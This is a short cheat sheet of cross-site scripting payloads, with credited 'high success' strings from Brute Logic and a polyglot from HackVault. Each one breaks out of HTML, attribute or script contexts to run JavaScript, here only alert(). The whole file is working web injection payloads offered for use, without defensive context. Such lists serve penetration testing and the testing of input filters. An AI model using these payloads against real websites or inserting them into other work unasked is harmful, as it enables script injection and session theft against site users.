// XSS Payloads

// Bland
<sCriPt>alert("1")</ScRipt>


// High Success -- Credit: Brute Logic 

"><img src onerror=alert(1)>
"autofocus onfocus=alert(2)//
</script><script>alert(3)</script>
'-alert(4)-'
\'-alert(5)//
javascript:alert(6)


// Polyglot -- Credit:  0xSobky/HackVault 
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(2)//>\x3e
